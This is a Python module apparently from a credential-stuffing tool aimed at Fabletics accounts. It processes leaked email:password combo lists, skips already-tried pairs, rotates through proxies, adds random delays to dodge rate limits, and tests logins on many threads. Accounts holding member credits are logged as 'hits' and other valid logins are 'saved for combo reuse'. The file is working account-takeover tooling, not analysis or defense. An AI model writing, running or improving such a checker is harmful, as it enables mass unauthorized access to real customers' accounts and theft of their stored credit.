from __future__ import annotations

import itertools
import os
import random
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Iterable

from fabletics.checker import _UNSET, check_account, parse_combo
from fabletics.proxy import parse_proxy

from .combo_store import iter_nonempty_lines
from .db import (
    FINAL_STATUSES,
    combo_key,
    get_checked_keys,
    insert_hit,
    insert_saved_combo,
    mark_combo_checked,
)


@dataclass
class JobStats:
    total: int = 0
    queued: int = 0
    skipped: int = 0
    checked: int = 0
    hits: int = 0
    valid: int = 0
    fails: int = 0
    retries: int = 0
    bans: int = 0
    errors: int = 0
    running: bool = False
    preparing: bool = False
    stop_requested: bool = False
    current: str = ""
    last_progress_at: float = 0.0
    logs: list[str] = field(default_factory=list)
    log_seq: int = 0


class CheckerWorker:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._thread: threading.Thread | None = None
        self.stats = JobStats()

    def is_running(self) -> bool:
        with self._lock:
            return self.stats.running or self.stats.preparing

    def start(
        self,
        *,
        combo_lines: list[str] | None = None,
        combo_file: Path | None = None,
        proxies: list[str],
        threads: int = 5,
    ) -> dict[str, Any]:
        with self._lock:
            if self.stats.running or self.stats.preparing:
                return {"ok": False, "error": "already_running"}

            if not combo_lines and (combo_file is None or not combo_file.exists()):
                return {"ok": False, "error": "no_combos"}

            parsed_proxies: list[str] = []
            for line in proxies:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                try:
                    parsed_proxies.append(parse_proxy(line))
                except ValueError:
                    continue

            self.stats = JobStats(
                running=True,
                preparing=True,
                logs=["Preparing combo list..."],
            )

        self._thread = threading.Thread(
            target=self._prepare_and_run,
            args=(combo_lines, combo_file, parsed_proxies, max(1, threads)),
            daemon=True,
        )
        self._thread.start()
        return {"ok": True, "status": "preparing"}

    def stop(self) -> None:
        with self._lock:
            self.stats.stop_requested = True

    def snapshot(self) -> dict[str, Any]:
        with self._lock:
            return {
                "total": self.stats.total,
                "queued": self.stats.queued,
                "skipped": self.stats.skipped,
                "checked": self.stats.checked,
                "hits": self.stats.hits,
                "valid": self.stats.valid,
                "fails": self.stats.fails,
                "retries": self.stats.retries,
                "bans": self.stats.bans,
                "errors": self.stats.errors,
                "running": self.stats.running,
                "preparing": self.stats.preparing,
                "current": self.stats.current,
                "last_progress_at": self.stats.last_progress_at,
                "log_seq": self.stats.log_seq,
                "logs": list(self.stats.logs[-200:]),
            }

    def _log(self, message: str) -> None:
        with self._lock:
            self.stats.logs.append(message)
            self.stats.log_seq += 1
            if len(self.stats.logs) > 1000:
                self.stats.logs = self.stats.logs[-1000:]

    def _iter_combo_lines(
        self,
        combo_lines: list[str] | None,
        combo_file: Path | None,
    ) -> Iterable[str]:
        if combo_lines is not None:
            return combo_lines
        if combo_file is not None:
            return iter_nonempty_lines(combo_file)
        return []

    def _prepare_and_run(
        self,
        combo_lines: list[str] | None,
        combo_file: Path | None,
        proxies: list[str],
        threads: int,
    ) -> None:
        try:
            checked_keys = get_checked_keys()
            parsed_combos: list[tuple[str, str]] = []
            seen_keys: set[str] = set()
            raw_count = 0

            for line in self._iter_combo_lines(combo_lines, combo_file):
                with self._lock:
                    if self.stats.stop_requested:
                        return

                raw_count += 1
                if raw_count % 10000 == 0:
                    self._log(f"Parsed {raw_count:,} lines...")

                parsed = parse_combo(line)
                if not parsed:
                    continue
                email, password = parsed
                key = combo_key(email, password)
                if key in seen_keys:
                    continue
                seen_keys.add(key)
                parsed_combos.append(parsed)

            to_run: list[tuple[str, str]] = []
            skipped = 0
            for email, password in parsed_combos:
                key = combo_key(email, password)
                if key in checked_keys:
                    skipped += 1
                else:
                    to_run.append((email, password))

            with self._lock:
                self.stats.total = len(parsed_combos)
                self.stats.queued = len(to_run)
                self.stats.skipped = skipped
                self.stats.preparing = False

            if skipped:
                self._log(f"Resuming — skipped {skipped:,} already-checked combo(s)")

            if not parsed_combos:
                with self._lock:
                    self.stats.running = False
                self._log("No valid combos found")
                return

            if not to_run:
                with self._lock:
                    self.stats.running = False
                self._log("All combos already checked — nothing to do")
                return

            self._log(f"Starting — {len(to_run):,} combo(s) queued")
            self._run(to_run, proxies, threads)
        except Exception as exc:
            with self._lock:
                self.stats.preparing = False
                self.stats.running = False
            self._log(f"ERROR | job prep failed | {exc}")

    def _pick_proxy(self, proxies: list[str], index: int) -> str | None:
        if not proxies:
            return None
        if len(proxies) == 1:
            return proxies[0]
        return random.choice(proxies)

    def _record_result(self, email: str, password: str, result) -> None:
        with self._lock:
            self.stats.checked += 1
            self.stats.last_progress_at = time.time()

        status = result.status.lower()
        if status in FINAL_STATUSES:
            mark_combo_checked(email, password, status)

        if result.status == "HIT":
            member_credits = int(result.data.get("member_credits") or 0)
            if member_credits > 0:
                line = result.format_hit()
                hit_id = insert_hit(line, email, password, result.data)
                with self._lock:
                    self.stats.hits += 1
                self._log(line)
                if hit_id is None:
                    self._log(f"DUPLICATE CREDIT HIT | {email}")
            else:
                saved_id = insert_saved_combo(email, password)
                with self._lock:
                    self.stats.valid += 1
                if saved_id is None:
                    self._log(f"VALID (dup) | {email}")
                else:
                    self._log(f"VALID | {email} — saved for combo reuse")
        elif result.status == "VALID":
            saved_id = insert_saved_combo(email, password)
            with self._lock:
                self.stats.valid += 1
            detail = result.message or "Valid login"
            if saved_id is None:
                self._log(f"VALID (dup) | {email} | {detail}")
            else:
                self._log(f"VALID | {email} | {detail}")
        elif result.status == "FAIL":
            with self._lock:
                self.stats.fails += 1
            self._log(f"FAIL | {email}:{password}")
        elif result.status == "RETRY":
            with self._lock:
                self.stats.retries += 1
            self._log(f"RETRY | {email} | {result.message}")
        elif result.status == "BAN":
            with self._lock:
                self.stats.bans += 1
            self._log(f"BAN | {email} | {result.message}")
        else:
            with self._lock:
                self.stats.errors += 1
            self._log(f"ERROR | {email} | {result.message}")

    def _run(
        self,
        combos: list[tuple[str, str]],
        proxies: list[str],
        threads: int,
    ) -> None:
        from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, TimeoutError, wait

        proxy_cycle = itertools.cycle(proxies) if proxies else None
        combo_iter = iter(enumerate(combos))
        inflight: dict = {}
        max_inflight = max(threads * 3, 4)
        task_timeout = int(os.environ.get("FABLETICS_TASK_TIMEOUT", "100"))

        def task(idx: int, email: str, password: str):
            with self._lock:
                if self.stats.stop_requested:
                    return None
                self.stats.current = email

            proxy = self._pick_proxy(proxies, idx) if proxy_cycle else _UNSET
            return check_account(email, password, proxy=proxy, timeout=45)

        def submit_next(pool) -> bool:
            with self._lock:
                if self.stats.stop_requested:
                    return False
            try:
                idx, (email, password) = next(combo_iter)
            except StopIteration:
                return False
            future = pool.submit(task, idx, email, password)
            inflight[future] = (email, password)
            return True

        try:
            with ThreadPoolExecutor(max_workers=threads) as pool:
                for _ in range(min(max_inflight, len(combos))):
                    if not submit_next(pool):
                        break

                while inflight:
                    done, _ = wait(inflight, return_when=FIRST_COMPLETED)
                    for future in done:
                        email, password = inflight.pop(future)
                        try:
                            result = future.result(timeout=task_timeout)
                        except TimeoutError:
                            with self._lock:
                                self.stats.checked += 1
                                self.stats.errors += 1
                                self.stats.last_progress_at = time.time()
                            self._log(f"TIMEOUT | {email} | exceeded {task_timeout}s")
                        except Exception as exc:
                            with self._lock:
                                self.stats.checked += 1
                                self.stats.errors += 1
                                self.stats.last_progress_at = time.time()
                            self._log(f"ERROR | {email} | {exc}")
                        else:
                            if result is not None:
                                self._record_result(email, password, result)
                            time.sleep(random.uniform(0.15, 0.45))

                        submit_next(pool)

                    with self._lock:
                        if self.stats.stop_requested:
                            for pending in inflight:
                                pending.cancel()
                            inflight.clear()
                            break
        finally:
            with self._lock:
                self.stats.running = False
                self.stats.preparing = False
                self.stats.stop_requested = False
                self.stats.current = ""
                self.stats.last_progress_at = 0.0


worker = CheckerWorker()
